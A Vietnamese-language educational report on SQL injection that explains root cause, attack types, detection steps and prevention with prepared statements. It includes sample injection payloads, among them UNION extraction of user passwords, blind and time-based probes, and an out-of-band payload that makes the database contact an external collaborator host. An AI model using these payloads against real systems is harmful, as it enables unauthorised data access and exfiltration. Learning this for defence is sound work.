# SQL Injection Report

## Overview
**SQL Injection (SQLi)** là 1 lỗ hổng bảo mật web xảy ra khi attacker có thể can thiệp vào câu lệnh SQL mà application gửi đến database, từ đó thực hiện các thao tác trái phép như truy cập, sửa đổi hoặc xóa dữ liệu.

## Root Cause
**User input** không được tách biệt khỏi SQL query, khiến dữ liệu đầu vào có thể được database diễn giải như một phần của câu lệnh SQL.

## Example 
* Cho URL `https://insecure-website.com/products?category=Gifts` với query tương ứng `SELECT * FROM products WHERE category = 'Gifts' AND released = 1`.

* Query này hiển thị các sản phẩm thuộc danh mục **Gifts** (điều kiện `category = 'Gifts'`) và sản phẩm đó đang được phát hành (điều kiện `released = 1`). Tuy nhiên nếu sửa URL: `https://insecure-website.com/products?category=Gifts'--` .

* Lúc này query bị biến đổi: `SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1`.

* Vì `--` sẽ comment toàn bộ đoạn code phía sau nên điều kiện `released = 1` không được áp dụng dẫn đến attacker sẽ truy cập được toàn bộ sản phẩm ngay cả khi chúng không được phát hành.

## Types of SQLi
* **In-band SQLi:** Dữ liệu truy vấn trả về trực tiếp trên giao diện web.
  * **UNION-based**
    * Mục đích: Ghép thêm kết quả từ bảng khác vào kết quả ban đầu, 2 câu lệnh phải trả về cùng số lượng cột và kiểu dữ liệu ở các cột phải tương thích.
    * Example:
      ```
      SELECT name, description
      FROM products
      WHERE id = 1
      UNION SELECT username, password
      FROM users
      ```
  * **Error-based**
    * Type 1: Dựa trên thông báo lỗi của DB để ép hiển thị dữ liệu nhạy cảm ra màn hình.
      * Example `CAST((SELECT version()) AS int)`.
    * Type 2: Dựa trên mã lỗi HTTP 200/500.
      * Example `CASE WHEN (1=1) THEN 1/0 ELSE '' END`.
* **Blind SQLi:** Web không in trực tiếp dữ liệu ra màn hình, phải suy đoán gián tiếp.
  * **Boolean-based**
    * Mục đích: Dựa vào khác biệt nội dung trang web khi mệnh đề True/False.
    * Example: `SUBSTRING((SELECT password FROM users WHERE username='administrator'), 1, 1) = 'a'`(True/False).
  * **Time-based**
    * Mục đích: Ép DB sleep trong một khoảng thời gian nếu điều kiện True/False.
    * Example: `WAITFOR DELAY '0:0:5'`.
* **Out-of-band SQLi (OAST)**
  * Mục đích: Ép DB gửi request DNS hoặc HTTP ra server bên ngoài khi không thấy kết quả phản hồi nào từ web.
  * Example: `SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual`.

## How to detect SQLi
1. Xác định **entry points** có khả năng truyền dữ liệu vào DB (GET, POST, HTTP Headers, Cookies, API Endpoints).
2. Gửi các **payload** đặc biệt tại các **entry points** vừa tìm được để xác định input có ảnh hưởng SQL query hay không:
   * Kí tự phá vỡ cú pháp: `'`,`"`,`\`,`)`.
   * Toán tử logic: `AND 1=1`(True) và `AND 1=2`(False).
   * Ki tự nối chuỗi hoặc ngắt lệnh: `;`,`--`,`#`.
   * Payload tạo **time delays**.
3. Xác định loại lỗi:
   * Web trả về mã lỗi 500 hoặc rò rỉ thông báo lỗi cú pháp -> **Error-based**.
   * `id=1'`/`id=1''` hoặc `AND 1=1`/`AND 1=2` làm (mất/hiện) dữ liệu -> **Union-based** hoặc **Boolean-based**.
   * Giao diện không đổi + payload thời gian hoạt động -> **Time-based**.
   * Các cách trên thất bại -> **OAST**.

## DBSM
Syntax SQL có thể khác nhau giữa các DBMS, vì vậy cần tham khảo cheat sheet phù hợp với DBMS đang được sử dụng.
`https://portswigger.net/web-security/sql-injection/cheat-sheet`

## How to prevent SQLi
SQL Injection xảy ra khi **user input** được nối trực tiếp vào câu lệnh SQL, cho phép input làm thay đổi cấu trúc của query. **Prepared Statements** giải quyết vấn đề này bằng cách tách câu lệnh SQL khỏi dữ liệu đầu vào: cấu trúc **query** được xác định trước, còn **user input** được truyền vào dưới dạng **parameters** và được xử lý như dữ liệu thuần túy.
* Vulnerable:
```
String query = "SELECT * FROM products WHERE category = '"+ input + "'";
Statement statement = connection.createStatement();
ResultSet resultSet = statement.executeQuery(query);
```
* Not-Vulnerable:
```
PreparedStatement statement = connection.prepareStatement("SELECT * FROM products WHERE category = ?");
statement.setString(1, input);
ResultSet resultSet = statement.executeQuery();
```
